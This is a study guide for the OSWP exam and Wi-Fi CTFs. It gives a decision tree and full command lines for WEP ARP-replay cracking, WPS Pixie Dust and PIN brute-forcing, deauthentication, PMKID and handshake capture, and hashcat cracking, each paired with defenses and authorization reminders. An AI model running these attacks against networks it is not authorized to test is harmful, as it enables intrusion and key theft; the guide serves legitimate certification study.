# OSWP / CTF Wi-Fi Competition Methodology

**Scope:** Authorized use only — your own gear, sanctioned CTFs, OffSec OSWP lab/exam, OSWP study. Every offensive step below pairs with its defense. For evil-twin / WPA-Enterprise this file covers **detection and concept only**; it does not build a credential-harvesting portal.

**Audience:** Learner wiring a repeatable, allowlist-gated local toolkit (Mac host + Kali VM + TP-Link RTL8188EUS 2.4 GHz adapter + Mac GPU for hashcat).

---

## 1. Concept (brief)

The OSWP (Offensive Security Wireless Professional, course **PEN-210 / "WiFu"**) exam and most Wi-Fi CTF tracks test the same thing: **can you take an unknown AP from "I see a beacon" to "I have the key / the creds, documented, under a time limit."** You are not graded on exotic 0-days. You are graded on **method, speed, and proof**: pick the cheapest attack that the target is actually vulnerable to, execute it cleanly, recover the secret, and write it down with evidence.

The winning mindset is a **decision tree, not a tool list**. A target advertises its own weaknesses in the beacon (WPS bit, cipher, PMKID support, client count). Read those first, then spend your time on the attack with the best expected-value-per-minute for *that* target.

> Exam specifics (duration, number of networks, pass threshold) are governed by OffSec's current exam guide and are under NDA. Treat the numbers in §3 as a planning model from publicly-reported structure, and confirm against the live exam guide. The **method** below is what transfers.

---

## 2. Lab / exam bootstrap (do this before the clock matters)

```bash
# 0. Identify the adapter and driver, kill interfering processes
airmon-ng                      # list PHYs + drivers (expect rtl8xxxu / 8188eu)
sudo airmon-ng check kill      # stop NetworkManager + wpa_supplicant that steal the iface
iw dev                         # confirm interface name (wlan0 / wlan1)

# 1. Monitor mode
sudo airmon-ng start wlan0     # may create wlan0mon (mac80211) — USE THAT NAME
iw dev                         # re-check the real monitor iface name after start
# manual alternative if airmon-ng misbehaves:
#   sudo ip link set wlan0 down
#   sudo iw dev wlan0 set type monitor
#   sudo ip link set wlan0 up

# 2. Prove injection works BEFORE you rely on it (biggest silent time-sink)
sudo aireplay-ng --test wlan0mon          # "Injection is working!"
# per-target injection quality:
#   sudo aireplay-ng --test -e <ESSID> -a <BSSID> wlan0mon

# 3. Regulatory domain (unlocks TX power / channels)
sudo iw reg set US
iw reg get
```

**RTL8188EUS note:** it is a solid, cheap 2.4 GHz injector but it is **2.4 GHz only** — you cannot see or attack 5/6 GHz targets with it. In a CTF with 5 GHz targets you need a different radio. Confirm the target band from the beacon (`airodump-ng` shows channel).

**Pitfall — the #1 beginner failure:** skipping `airmon-ng check kill`. NetworkManager silently re-tunes the channel mid-capture and your handshake never lands. Kill it, and re-kill it after any reconnect.

---

## 3. The exam/competition clock — time-boxed model

A proctored Wi-Fi exam or CTF is won on **triage discipline**, not depth. Model your run as budget-per-target:

| Phase | Budget | Goal |
|---|---|---|
| Recon (all targets) | first 15–20 min | One `airodump-ng` sweep → table of every target with cipher, WPS bit, clients, signal |
| Per-target triage | 2–3 min each | Decide the attack from the decision tree (§4), don't start cracking yet |
| Quick wins first | front-load | WEP, WPS-Pixie, PMKID-on-weak-PSK — anything that can finish in minutes |
| Slow attacks parked | background | Long dictionary/mask cracks run on the GPU **while you work another target** |
| Documentation | rolling, not last | Screenshot the moment you get the key — don't "do it at the end" |

**Golden rules of scoring:**

1. **Breadth before depth.** Three half-finished targets score less than two fully-documented ones. Finish and *prove* one before opening the next.
2. **Every attack runs in parallel with thinking.** The GPU cracks while you enumerate the next AP. A `tmux` pane per target.
3. **Document at the moment of success**, inside the run: `airodump` screenshot (handshake line), the `hashcat`/`aircrack` crack line showing the key, and the key in plaintext. Exams fail people who found the key but can't prove it.
4. **Don't rabbit-hole.** If an online WPS brute is rate-limited and crawling, park it and move on. Expected value per minute, always.
5. **Keep a scratch log** (`results.md`) per target: BSSID, channel, cipher, attack chosen, status, key. This becomes your report.

`tmux` skeleton:
```bash
tmux new -s wifi
# pane 1: airodump recon   pane 2: capture target A   pane 3: hashcat   pane 4: notes
```

---

## 4. Master decision tree — which attack first, per target

Run the recon sweep, then for **each** target walk this order (top = cheapest/fastest expected win):

```
                    ┌─────────────────────────────────────────┐
                    │  airodump-ng sweep: read ENC/CIPHER/AUTH  │
                    └───────────────────┬───────────────────────┘
                                        │
   ENC = WEP ───────────────────────────► §5  ARP-replay IVs → aircrack (minutes)
                                        │
   WPS bit set (wash shows it, Locked=No)► §6  PIXIE DUST first (offline, seconds-min)
                                        │         └─ fail → online PIN brute (hours, park it)
                                        │
   WPA/WPA2-PSK ────────────────────────► §7  PMKID (clientless) → else deauth+handshake
                                        │         → hashcat -m 22000 (GPU)
                                        │
   WPA/WPA2/WPA3-Enterprise (MGT/802.1X)─► §9  DETECT + concept only (EAP recon, downgrade awareness)
                                        │
   WPA3-SAE / WPA3-only ────────────────► no offline PSK capture; note + move on unless
                                            transition-mode (WPA2/3 mixed) → treat as WPA2
```

**Read the beacon correctly** — this is where points are won or lost:
- `ENC=WEP` → §5. Fast, deterministic, do it immediately.
- `AUTH=PSK` + a WPS-capable AP (`wash`) → **try Pixie Dust before anything else**; it's offline and can finish in under a minute on vulnerable chipsets.
- `AUTH=PSK`, no WPS or WPS locked → PMKID / handshake + GPU crack.
- `AUTH=MGT` → Enterprise (802.1X/EAP) → §9, detection posture only.
- `WPA3` alone → SAE; no dictionary-vs-handshake path. Check for **transition mode** (an AP advertising both WPA2 and WPA3) and attack the WPA2 side.

---

## 5. WEP — do it first, it's deterministic

WEP is broken by **IV volume**, not guessing. Goal: collect ~40k–85k IVs, then PTW-crack.

```bash
# lock capture to the target; DO NOT use --ivs (you need full packets for replay)
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon

# if no clients: fake-auth to the AP so it accepts your injected packets
sudo aireplay-ng --fakeauth 0 -e "<ESSID>" -a <BSSID> wlan0mon
#   stubborn AP: sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -e "<ESSID>" -a <BSSID> wlan0mon

# generate traffic: ARP replay pumps the IV count fast
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR-MON-MAC> wlan0mon
#   throttle if the AP chokes: add  -x 50   (packets/sec)

# optional: nudge a client to emit an ARP so replay has something to reinject
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT-MAC> wlan0mon

# crack (PTW) — run it live against the growing capture
sudo aircrack-ng -b <BSSID> wep-01.cap
#   explicit PTW on a saved file: aircrack-ng -z wep-01.cap
```
**Pitfall:** `--ivs` saves space but strips the full frames ARP-replay needs — never use it for a WEP attack. **Pro tip:** start `aircrack-ng` while `airodump` is still filling the file; it re-reads as IVs climb and pops the key the instant there are enough.

**Defense:** WEP is dead — RC4 key reuse and the PTW attack make recovery trivial. Migrate to **WPA2-AES (CCMP)** at minimum, WPA3-SAE where supported. There is no safe WEP configuration.

---

## 6. WPS — Pixie Dust first, online brute as last resort

### 6a. Find WPS APs
```bash
sudo wash -i wlan0mon            # survey; Vendor column helps spot Pixie candidates
sudo wash -i wlan0mon -c 6       # pin a channel
sudo wash -i wlan0mon -2 -s      # 2.4 GHz, scan mode
```
Read the **Lck** (locked) and **Vendor** columns. `Lck=No` on a Ralink/Broadcom/Realtek chipset = prime Pixie Dust target.

### 6b. Pixie Dust (OFFLINE — try this first, it's seconds-to-minutes)
Exploits weak/empty E-S1/E-S2 nonce entropy; no PIN guessing against the AP.
```bash
# reaver-wps-fork-t6x drives pixiewps automatically:
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K -vv      # -K == --pixie-dust (-Z is the alias)
# bully alternative:
sudo bully -b <BSSID> -c <CH> -d wlan0mon              # -d == --pixiewps
```
Reaver passes PKE, PKR, E-Hash1, E-Hash2, E-Nonce, Authkey to pixiewps for you. On recovery:
```bash
# once the PIN is known, pull the actual WPA passphrase:
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -p <8-DIGIT-PIN> -vv
```
Standalone pixiewps (if you captured the values with a modified reaver/bully):
```bash
pixiewps --pke <PKE> --pkr <PKR> --e-hash1 <H1> --e-hash2 <H2> --authkey <AK> --e-nonce <NONCE>
```
**Pitfall:** do **not** use `-S`/`--dh-small` against Realtek APs (and the pixiewps project now marks `-S` deprecated — "never use in Reaver"). It breaks buggy routers and wastes the attempt.

### 6c. Online PIN brute force (SLOW — park it, don't babysit)
Only 11,000 combinations (7 PIN digits + checksum, split 4+3), but rate-limiting/locks make it hours.
```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv
# tuning that actually matters:
#   -d 2      delay between attempts (be gentle so the AP doesn't lock)
#   -t 10     receive timeout        -T 0.40  M5/M7 timeout
#   -l 60     wait after a lock       -L       ignore locks (aggressive; can backfire)
#   -r 3:60   sleep 60s every 3 attempts (cool-down to avoid lockout)
#   -w        mimic a Windows 7 registrar (some APs only answer this)
#   -N        don't send NACKs        -E  end each session with EAP-FAIL (flaky APs)
#   -g <n>    stop after n attempts   -c implies -f (no channel hopping)
# bully equivalent:
sudo bully -b <BSSID> -c <CH> -L -F -B -v 3 wlan0mon   # -B brute the checksum digit
```
**Decision rule:** if `wash` shows `Lck=Yes` or reaver reports repeated `WPS transaction failed`/lock, this AP is rate-limiting — Pixie already failed — **move on** and let a PSK attack carry the target instead.

**Defense:** **Disable WPS entirely** (especially external-registrar PIN). If WPS is mandated, use only push-button (PBC) with a short activation window, pick APs with proper nonce entropy, and enable lockout after failed PINs. WPS PIN is the single most common home-AP break.

---

## 7. WPA/WPA2-PSK — PMKID then handshake, crack on GPU

This is the bread-and-butter OSWP target. Two ways to get crackable material; **try PMKID first** because it needs no client.

### 7a. PMKID (clientless, one frame from the AP)
Modern path uses **hcxdumptool → hcxpcapngtool → hashcat**.
```bash
# stop services that fight for the radio (hcxdumptool wants exclusive access)
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

# capture (PMKID + EAPOL). --rds=1 = real-time display sorted; -F = all frequencies the radio supports
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -F
#   (hcxdumptool manages its own monitor mode + random MAC — do NOT pre-set monitor or use macchanger)

# restart services when done
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

# convert to hashcat 22000 format (PMKID *and* EAPOL both land in .hc22000)
hcxpcapngtool -o hash.hc22000 dump.pcapng

# optional: filter to just the exam target so you don't crack the whole neighborhood
hcxhashtool -i hash.hc22000 --essid=<ESSID> -o target.hc22000
```
**Hard rules from the hcx authors (each one is a silent failure if ignored):**
- **Never `wpaclean`, never merge pcapng files, never filter during capture** — it destroys the custom-block hash assignments and nonce data.
- Don't run hcxdumptool on a *logical/virtual* interface, and don't run it alongside aircrack-ng/reaver/bully on the same radio.
- hcx does **no nonce-error correction** — packet loss yields a wrong PTK, so capture cleanly (close to the AP, minimal deauth spam).

### 7b. 4-way handshake (when there's a client to kick)
Classic **airodump + aireplay** path, still 100% valid and often faster to *verify*:
```bash
# lock capture to channel+BSSID, full frames (NO --ivs)
sudo airodump-ng -c <CH> --bssid <BSSID> -w psk wlan0mon

# force a reconnect — send the MINIMUM deauths (over-deauthing stops clients reconnecting)
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT-MAC> wlan0mon
#   broadcast deauth (no specific client, less reliable): aireplay-ng -0 1 -a <BSSID> wlan0mon
```
**Confirm you actually got it** before you tear down:
- airodump top-right shows `WPA handshake: <BSSID>`.
- Or in Wireshark apply filter `eapol` — you want a complete M1–M4 (a valid M1+M2 or M2+M3 pair is enough for cracking).

### 7c. Crack on the Mac GPU (hashcat, mode 22000)
```bash
# dictionary
hashcat -m 22000 target.hc22000 wordlist.txt
hashcat -m 22000 target.hc22000 cracked.txt.gz          # gzipped lists work directly

# rules (force-multiply a good list)
hashcat -m 22000 target.hc22000 -r rules/best66.rule rockyou.txt
hashcat -m 22000 target.hc22000 -r rules/d3ad0ne.rule wordlist.txt

# mask / brute (targeted — know the keyspace before you start)
hashcat -m 22000 target.hc22000 -a 3 ?d?d?d?d?d?d?d?d   # 8-digit numeric (common router default)
hashcat -m 22000 target.hc22000 -a 3 ?u?l?l?l?l?l?d?d   # structured guess

# verify an already-known PMK (64 hex) with mode 22001
hashcat -m 22001 target.hc22000 <PMK>

# legacy aircrack path still works on a .cap handshake:
aircrack-ng -w rockyou.txt -b <BSSID> psk-01.cap
```
**Speed tips:**
- **Estimate keyspace first.** Use hashcat's `--keyspace` / the project's combination calculator before any `-a 3` brute — an 8-char full-charset mask is years; an 8-*digit* mask is minutes.
- **Front-load likely lists:** router-default patterns (`?d?d?d?d?d?d?d?d`, phone numbers, `?u?l?l?l?l?l?d?d`), then `rockyou`, then rockyou+rules, then masks.
- Run `hashcat` on the **Mac GPU** in a pane while you enumerate the next AP — never block on it.
- `--username`, `-O` (optimized kernel, ≤ length limits), and a good `-w 3` workload profile squeeze more h/s on Apple silicon.
- Modes note: **22000** (PMKID+EAPOL) supersedes the deprecated **2500** (hccapx) and **16800** (PMKID-only). Always convert to 22000.

**Defense:** PSK strength is everything once a handshake leaks — and it *will* leak (PMKID is one unauthenticated frame). Use a **long, random, non-dictionary passphrase** (20+ chars, not a phone number or `Name+1234`). Disable PMKID where the AP allows, deploy **802.11w (PMF/Management Frame Protection)** to blunt deauth-driven handshake capture, and move to **WPA3-SAE** (handshake is not offline-crackable). Enterprise 802.1X removes the shared PSK entirely.

---

## 8. Recon reference — the sweep that drives everything

```bash
# full 2.4 GHz sweep, write everything, read the table
sudo airodump-ng -w recon --output-format pcap,csv wlan0mon
#   columns that decide the attack: ENC, CIPHER, AUTH, #Data (traffic), WPS (via wash), clients (lower pane)

# band / channel control
sudo airodump-ng --band bg wlan0mon            # 2.4 GHz b/g (RTL8188EUS range)
sudo airodump-ng -c 1,6,11 wlan0mon            # dwell on the common 2.4 GHz channels

# per-target detail once chosen
sudo airodump-ng -c <CH> --bssid <BSSID> -w <name> wlan0mon
```
Parse `recon-01.csv` to auto-build your target table (BSSID, channel, ENC, ESSID, client count). An **allowlist gate** belongs here: before any `aireplay`/`reaver`/`hcxdumptool` fires, check the target BSSID against your authorized list and refuse otherwise.

---

## 9. WPA-Enterprise (802.1X / EAP) — DETECTION + concept only

**This section is defensive/awareness. It does not build a credential-stealing portal.** In OSWP/CTF terms you must *recognize* an Enterprise target and understand why a rogue-AP downgrade is dangerous — not deploy one against people.

**Detect it:** in `airodump-ng` the `AUTH` column reads **`MGT`** (not `PSK`). That means RADIUS-backed 802.1X; there is no shared passphrase to crack. The real-world risk is a **rogue AP that impersonates the ESSID and runs a weak inner method** (PEAP/EAP-MSCHAPv2, EAP-GTC), tricking a mis-configured client into leaking a challenge/response.

**Why MSCHAPv2 is the weak link (concept):** the EAP-MSCHAPv2 inner handshake is a known-plaintext DES construction whose effective strength collapses to a single DES key — captured challenge/response pairs are offline-crackable (historically `asleap`, or hashcat **mode 5500** NetNTLMv1 / MSCHAPv2). This is *why* the downgrade matters, stated so you can defend against it.

**The rogue-AP tooling exists** (e.g. `eaphammer --cert-wizard` to generate certs, then a `--creds` capture mode, and automatic GTC-downgrade attempts). **Do not operate it against real users.** In an authorized exam/CTF, only run such tooling against lab clients that are explicitly in scope and that you control, and never to harvest third-party credentials.

**Defense (the point of this section):**
- Clients **must validate the RADIUS server certificate** and pin the CA + server name — this single setting defeats the entire rogue-AP/downgrade class.
- Disable fallback to weak inner methods; **prefer EAP-TLS (mutual certs)** over PEAP/MSCHAPv2.
- Enable **802.11w (PMF)** and server-side anomaly detection (impossible-travel, duplicate-cert alerts).
- Monitor for duplicate ESSIDs / unexpected BSSIDs (rogue-AP detection) and for RADIUS auth spikes from new APs.

---

## 10. WPA3-SAE — know the limits

- **WPA3-SAE (Dragonfly)** replaces the offline-crackable handshake with a password-authenticated key exchange: capturing frames does **not** yield offline-crackable material the way a WPA2 handshake does. A plain "capture + dictionary" path does not apply.
- **Transition mode** is the practical opening: an AP advertising **both WPA2 and WPA3** can be attacked on its WPA2 side (capture a WPA2 handshake/PMKID as in §7). Check the beacon RSN info for mixed mode.
- Historical side-channel/downgrade research (Dragonblood) targeted specific implementations/timing; treat as implementation-specific and out of scope for a standard dictionary workflow.
- **Decision rule in a timed event:** a pure WPA3-SAE target with no transition mode and no known implementation flaw is a low-EV target — note it and spend the minutes on a WEP/WPS/PSK target you can actually finish.

**Defense:** deploy **WPA3-SAE only** (disable transition mode once clients support WPA3), keep AP firmware current for Dragonblood-class fixes, and enable PMF (mandatory in WPA3).

---

## 11. Consolidated gotchas / pitfalls (the time-sinks)

1. **Didn't `airmon-ng check kill`** → NetworkManager retunes your channel mid-capture; handshake never completes.
2. **Used `--ivs`** on a WEP/WPA capture → stripped the full frames you needed; start over.
3. **Over-deauthed** → client can't reconnect, so it never re-handshakes; send `-0 1`, wait, repeat sparingly.
4. **Merged/cleaned pcapng** (`wpaclean`, file merge) before hcxpcapngtool → destroyed hash blocks; capture fresh.
5. **Ran hcxdumptool with macchanger / on a virtual iface / alongside aircrack** → it fights for the radio and gets nothing.
6. **Brute-forced a full-charset 8-char mask** without checking keyspace → "cracking" for years; always estimate first.
7. **WPS online brute against a locked AP** → crawling, lockouts; if `Lck=Yes`, Pixie failed — move to PSK.
8. **5 GHz target + 2.4 GHz-only RTL8188EUS** → you literally cannot see it; confirm band before burning time.
9. **Never verified the handshake** (`eapol` filter / airodump banner) → you tear down and "crack" an empty capture.
10. **Documented at the end** → ran out of time with keys found but unproven. Screenshot at the moment of success.

---

## 12. One-screen exam cheat flow

```
check kill → monitor → injection --test → iw reg set US
   │
airodump sweep (15 min) → build target table (ENC/AUTH/WPS/clients) → allowlist gate
   │
for each target (best EV first):
   WEP?        → fakeauth → arpreplay → aircrack  (minutes)       ✅ document
   WPS open?   → reaver -K / bully -d  (pixie, offline)           ✅ document
               → else online brute (-d2 -r3:60), PARK it
   WPA2-PSK?   → hcxdumptool PMKID → hcxpcapngtool → hashcat -m 22000
               → else deauth -0 1 → handshake → verify eapol → hashcat
               → GPU cracks in a pane WHILE you open the next target
   MGT (Ent.)? → detect only; note cert-validation defense
   WPA3-SAE?   → transition mode → WPA2 side; else low-EV, note & move on
   │
screenshot key + crack line the instant it pops → results.md → next target
```

---

## Sources

Primary/authoritative documentation actually used (authorized-testing framing throughout):

1. hashcat wiki — Cracking WPA/WPA2 (modes 22000/22001, hcxdumptool capture, hcxpcapngtool conversion, dict/mask/rule examples): https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
2. aircrack-ng wiki — Cracking WPA/WPA2 PSK (airodump capture, deauth, handshake confirmation, aircrack-ng): https://www.aircrack-ng.org/doku.php?id=cracking_wpa
3. aircrack-ng wiki — Newbie Guide / WEP workflow (airmon-ng, airodump-ng, fakeauth, arpreplay, deauth, PTW): https://www.aircrack-ng.org/doku.php?id=newbie_guide
4. reaver-wps-fork-t6x README — wash, reaver online brute, Pixie Dust (-K/-Z), timing flags: https://github.com/t6x/reaver-wps-fork-t6x
5. Kali Tools — reaver (full reaver + wash flag tables, usage examples): https://www.kali.org/tools/reaver/
6. Kali Tools — bully (usage + flags, -d pixiewps, -B brute, -L lockignore): https://www.kali.org/tools/bully/
7. pixiewps README (standalone usage, required args, -S deprecation): https://github.com/wiire-a/pixiewps
8. hcxdumptool README (capture vectors, disable flags, interface/macchanger warnings, pipeline): https://github.com/ZerBea/hcxdumptool
9. hcxtools README (pipeline, hcxpcapngtool/hcxhashtool, 22000 vs deprecated 2500/16800, no-merge rule): https://github.com/ZerBea/hcxtools
10. eaphammer README (WPA-Enterprise concept: cert-wizard, GTC-downgrade awareness — detection/defense context only): https://github.com/s0lst1c3/eaphammer

Exam-structure specifics (duration, target count, pass mark) intentionally left to OffSec's current OSWP/PEN-210 exam guide (under NDA); the §3 model is a planning aid, not a quoted spec.

> **Authorization reminder:** run every command in this file only against networks you own or are explicitly authorized to test (your lab, a sanctioned CTF, the OSWP exam lab). The allowlist gate in §8 is not optional.
